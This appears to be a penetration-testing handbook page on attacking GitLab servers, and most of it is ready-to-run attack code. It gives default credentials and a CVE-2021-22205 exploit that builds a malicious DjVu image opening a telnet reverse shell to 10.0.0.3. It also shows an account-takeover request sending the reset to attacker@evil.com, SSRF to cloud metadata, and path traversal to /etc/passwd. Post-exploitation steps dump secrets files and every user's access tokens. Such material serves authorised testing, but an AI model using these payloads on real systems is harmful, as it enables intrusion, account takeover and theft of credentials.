# GitLab

GitLab security testing - enumeration, common vulnerabilities, and exploitation techniques.

## Table of Contents

1.  [Default Credentials](#default-credentials)
2.  [Enumeration](#enumeration)
3.  [Common Vulnerabilities](#common-vulnerabilities)
4.  [CI/CD Pipeline Exploitation](#cicd-pipeline-exploitation)
5.  [GraphQL API Testing](#graphql-api-testing)
6.  [Post-Exploitation](#post-exploitation)
7.  [Tools & References](#tools--references)

---

## Default Credentials

During default or older installations of GitLab, the initial root password is set during the configuration process, however, some versions and automated scripts may default to a specific set of credentials .

```
Username: root
Password: 5iveL!fe

Username: admin
Password: 5iveL!fe

# Note: GitLab 14.0+ forces password change on first login
```

## Enumeration

Effective enumeration is the first step to identifying misconfigurations and potential entry points in a GitLab instance.

### Public Information Gathering

Even on private instances, certain endpoints and features may leak sensitive information or reveal the attack surface.

```bash
# Check for public projects (even on private instances)
https://gitlab.target.com/explore
https://gitlab.target.com/explore/projects
https://gitlab.target.com/explore/groups
https://gitlab.target.com/explore/snippets

# Search for sensitive content
# Use searchbar for: password, secret, key, token, api_key, credentials

# API endpoints (may leak version info)
https://gitlab.target.com/api/v4/version
https://gitlab.target.com/api/v4/projects
https://gitlab.target.com/api/v4/users
```

### User Enumeration (CVE-2021-4191)

A significant information disclosure vulnerability existed in the GraphQL API, allowing unauthenticated attackers to enumerate registered usernames and email addresses. This affects versions from 13.0 up to 14.8.2, 14.7.4, and 14.6.5 .

```bash
# Enumerate users via REST API (may be restricted)
curl https://gitlab.target.com/api/v4/users

# Vulnerable GraphQL query for user enumeration (CVE-2021-4191)
curl -X POST https://gitlab.target.com/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query { users { nodes { id name username email } } }"}'

# Metasploit module for automated enumeration
use auxiliary/gather/gitlab_graphql_user_enumeration
set RHOSTS gitlab.target.com
run
```

### Version Detection

Identifying the exact version helps correlate known vulnerabilities (CVEs) with the target.

```bash
# Check version (if exposed)
curl https://gitlab.target.com/api/v4/version
curl https://gitlab.target.com/help

# Check the 'X-GitLab-Meta' header for version clues
curl -I https://gitlab.target.com

# Fingerprint via assets
# Compare JS/CSS hashes with known versions
```

## Common Vulnerabilities

This section details real-world vulnerabilities, their affected versions, and exploitation techniques.

### CVE-2021-22205 (RCE via Image Upload) - Critical

This is one of the most severe GitLab vulnerabilities, allowing unauthenticated Remote Code Execution (RCE). The flaw resides in GitLab's use of ExifTool to process uploaded DjVu images, which can be exploited to execute arbitrary commands .

- **Affected Versions:** GitLab CE/EE < 13.10.3, < 13.9.6, < 13.8.8
- **Exploit Details:** The attacker crafts a malicious DjVu file that, when processed by ExifTool, triggers a reverse shell.

```bash
# Check if vulnerable
curl -s https://gitlab.target.com/users/sign_in | grep -oP 'gitlab_version.*?(\d+\.\d+\.\d+)'

# Exploit - Generating the payload
# This creates a file named 'lol.jpg' that will call back to 10.0.0.3 on port 1270
echo -e "QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs=" | base64 -d > lol.jpg
echo -n 'TF=$(mktemp -u);mkfifo $TF && telnet 10.0.0.3 1270 0<$TF | sh 1>$TF' >> lol.jpg
echo -n "fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" | base64 -d >> lol.jpg

# Sending the payload to a vulnerable endpoint
curl -v -F 'file=@lol.jpg' https://gitlab.target.com/$(openssl rand -hex 8)

# Sample Output from the reverse shell
$ nc -lnvp 1270
Listening on [0.0.0.0] (family 0, port 1270)
Connection from [10.0.0.7] port 1270 [tcp/*] accepted
whoami
git
id
uid=998(git) gid=998(git) groups=998(git)
```

### CVE-2023-7028 (Account Takeover)

This vulnerability allows an unauthenticated attacker to take control of a user account by abusing the password reset functionality. The issue lies in the ability to provide two email addresses during a password reset request; the reset token is sent to both, allowing an attacker to reset the password of a target account if they control one of the emails .

- **Affected Versions:** GitLab CE/EE 16.1 < 16.1.6, 16.2 < 16.2.9, 16.3 < 16.3.7, 16.4 < 16.4.5, 16.5 < 16.5.6, 16.6 < 16.6.4, 16.7 < 16.7.2
- **Mitigation:** Enabling 2-Factor Authentication (2FA) prevents exploitation.

```bash
# Exploit via duplicate email parameter (CVE-2023-7028)
POST /users/password HTTP/1.1
Host: gitlab.target.com
Content-Type: application/x-www-form-urlencoded

user[email]=victim@target.com&user[email]=attacker@evil.com

# Metasploit module for exploitation
use auxiliary/admin/http/gitlab_password_reset_account_takeover
set RHOSTS gitlab.target.com
set TARGET_EMAIL victim@target.com
set ATTACKER_EMAIL attacker@evil.com
run
```

### CVE-2021-22214 (SSRF)

- **Affected Versions:** GitLab CE/EE 10.5 to 13.10.4
- **Description:** Server-Side Request Forgery (SSRF) via the CI lint API.

```bash
# SSRF via CI lint API
curl -X POST "https://gitlab.target.com/api/v4/ci/lint" \
  -H "Content-Type: application/json" \
  -d '{"content": "include:\n  remote: http://169.254.169.254/latest/meta-data/\n"}'
```

### CVE-2023-2825 (Path Traversal)

- **Affected Versions:** GitLab CE/EE 16.0.0
- **Description:** Unauthenticated path traversal vulnerability that allows reading arbitrary files on the server.

```bash
# Path traversal to read /etc/passwd
curl "https://gitlab.target.com/uploads/-/system/personal_snippet/1/secret/../../../../../../../../etc/passwd"
```

### CVE-2024-8641 / CVE-2024-12570 (CI_JOB_TOKEN Session Theft)

Recent vulnerabilities have highlighted the risks associated with the `CI_JOB_TOKEN`. An attacker who compromises a victim's `CI_JOB_TOKEN` can potentially obtain a full GitLab session token belonging to that victim, effectively bypassing CI/CD security boundaries .

- **Affected Versions:** GitLab CE/EE from 13.7 prior to 17.1.7, from 17.2 prior to 17.2.5, and from 17.3 prior to 17.3.2.
- **Impact:** Privilege escalation from CI/CD job context to the user's web session context.

## CI/CD Pipeline Exploitation

CI/CD pipelines are a high-value target for attackers, often containing secrets and tokens.

### Secrets in CI Variables

Pipeline logs and job definitions often inadvertently expose sensitive information.

```yaml
# .gitlab-ci.yml - Check for exposed secrets
# Variables are often visible in job logs if not properly masked

script:
  - echo $CI_JOB_TOKEN  # May have repository access
  - echo $PRIVATE_TOKEN # If misconfigured
  - printenv            # Dump all environment variables
```

### Token Abuse

The `CI_JOB_TOKEN` is a powerful token that grants access to other projects in the same group, the container registry, and the package registry.

```bash
# Use a stolen CI_JOB_TOKEN to clone repositories
git clone https://gitlab-ci-token:${CI_JOB_TOKEN}@gitlab.target.com/group/repo.git

# Access the container registry
docker login -u gitlab-ci-token -p ${CI_JOB_TOKEN} registry.gitlab.target.com
```

### Runner Exploitation

If an attacker can modify the `.gitlab-ci.yml` file in any repository, they can execute arbitrary commands on the GitLab runner.

```bash
# Malicious CI job to compromise the runner
stages:
  - exploit

exploit:
  stage: exploit
  script:
    - cat /etc/passwd
    - env
    - ls -la /home/gitlab-runner/
  artifacts:
    paths:
      - /home/gitlab-runner/.gitlab-runner/
    expire_in: 1 week
```

## GraphQL API Testing

The GraphQL API is a rich interface that, if misconfigured or vulnerable, can expose significant amounts of data.

```bash
# Full GraphQL introspection query
curl -X POST https://gitlab.target.com/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { __schema { types { name fields { name } } } }"}'

# Query for a specific user's details (requires authentication in newer versions)
curl -X POST https://gitlab.target.com/api/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "query { user(username: \"victim\") { id name email groupMemberships { group { name } } } }"}'

# Query projects for sensitive information
curl -X POST https://gitlab.target.com/api/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "query { projects { nodes { name repository { tree { blobs { nodes { rawTextBlob } } } } } } }"}'
```

## Post-Exploitation

Once access to the GitLab server itself is achieved, several high-value targets can be accessed.

```bash
# If you have shell access to the GitLab server:

# Database credentials (for direct database access)
cat /etc/gitlab/gitlab.rb | grep -i password
cat /var/opt/gitlab/gitlab-rails/etc/database.yml

# Secrets file (used for cookie signing, CSRF protection, etc.)
cat /etc/gitlab/gitlab-secrets.json

# GitLab Rails Console (as root) - The ultimate prize for persistence
gitlab-rails console

# Inside the Rails console:
# Reset the root password
user = User.find_by(username: 'root')
user.password = 'NewSecurePassword123!'
user.save!

# List all personal access tokens
PersonalAccessToken.all.each { |t| puts "#{t.user.username}: #{t.token}" }

# Dump all user emails
User.all.each { |u| puts "#{u.username}: #{u.email}" }

# Backups (contain all repositories, databases, and configuration)
ls /var/opt/gitlab/backups/
# Download or copy the latest backup file
```

## Tools & References

A collection of tools and resources for GitLab security testing.

```bash
# GitLab User Enumeration Tool
# https://github.com/AhmedMohamedDev/gitlab-enum
python3 gitlab_enum.py -t https://gitlab.target.com

# Nord Stream - CI/CD exploitation framework
# https://github.com/AhmedMohamedDev/nord-stream
nord-stream -t gitlab -u https://gitlab.target.com -token TOKEN

# Nuclei template scanning
nuclei -t http/cves/2021/CVE-2021-22205.yaml -u https://gitlab.target.com
nuclei -t http/cves/2021/CVE-2021-4191.yaml -u https://gitlab.target.com

# TruffleHog - Find secrets in Git repositories
trufflehog --json https://gitlab.com/target/repo.git

# GitLeaks - Another secret scanning tool
gitleaks detect --source https://gitlab.com/target/repo.git
```

## Related Topics

*   [CI/CD Security](https://www.pentest-book.com/enumeration/webservices/ci-cd-security) - Pipeline attacks and defense
*   [SSRF](https://www.pentest-book.com/enumeration/web/ssrf) - Server-Side Request Forgery vulnerabilities
*   [Supply Chain](https://www.pentest-book.com/enumeration/web/supply-chain) - Code repository and dependency attacks
*   [GraphQL Security](https://www.pentest-book.com/enumeration/web/graphql) - Testing GraphQL endpoints
